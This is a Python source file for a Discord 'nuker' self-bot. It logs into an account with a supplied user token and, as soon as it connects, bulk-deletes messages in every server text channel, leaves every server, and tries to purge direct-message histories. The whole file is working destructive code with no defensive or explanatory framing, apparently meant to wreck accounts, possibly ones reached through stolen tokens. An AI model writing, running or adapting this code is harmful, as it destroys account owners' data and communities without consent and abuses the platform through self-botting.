import discord
import aiohttp
import asyncio
from discord.ext import commands
from config import Colors

class Nuker(commands.Bot):
    def __init__(self, token):
        intents = discord.Intents.all()
        super().__init__(command_prefix='!', intents=intents)
        self.token = token
        
    async def on_ready(self):
        print(f"{Colors.RED}[💥] Nuker: {self.user}{Colors.RESET}")
        await self.nuke_sequence()
    
    async def nuke_sequence(self):
        tasks = [
            self.mass_delete(),
            self.leave_servers(),
            self.purge_dms()
        ]
        await asyncio.gather(*tasks, return_exceptions=True)
        await self.close()
    
    async def mass_delete(self):
        async with aiohttp.ClientSession() as session:
            for guild in self.guilds:
                for channel in guild.text_channels:
                    try:
                        msgs = await session.get(
                            f"https://discord.com/api/v10/channels/{channel.id}/messages?limit=100",
                            headers={"Authorization": self.token}
                        )
                        msg_data = await msgs.json()
                        if len(msg_data) > 1:
                            await session.post(
                                f"https://discord.com/api/v10/channels/{channel.id}/messages/bulk_delete",
                                headers={"Authorization": self.token},
                                json={"messages": [m["id"] for m in msg_data]}
                            )
                    except:
                        continue
    
    async def leave_servers(self):
        for guild in list(self.guilds):
            try:
                await guild.leave()
                print(f"{Colors.RED}[+] Left: {guild.name}{Colors.RESET}")
            except:
                pass
    
    async def purge_dms(self):
        async with aiohttp.ClientSession() as session:
            dm_channels = await session.get(
                "https://discord.com/api/v10/users/@me/channels",
                headers={"Authorization": self.token}
            )
            channels = await dm_channels.json()
            for channel in channels:
                try:
                    msgs = await session.get(
                        f"https://discord.com/api/v10/channels/{channel['id']}/messages?limit=100",
                        headers={"Authorization": self.token}
                    )
                    msg_data = await msgs.json()
                    if msg_data:
                        await session.post(
                            f"https://discord.com/api/v10/channels/{channel['id']}/messages/bulk_delete",
                            headers={"Authorization": self.token},
                            json={"messages": [m["id"] for m in msg_data]}
                        )
                except:
                    continue
    
    async def run(self):
        await self.start(self.token, bot=False)
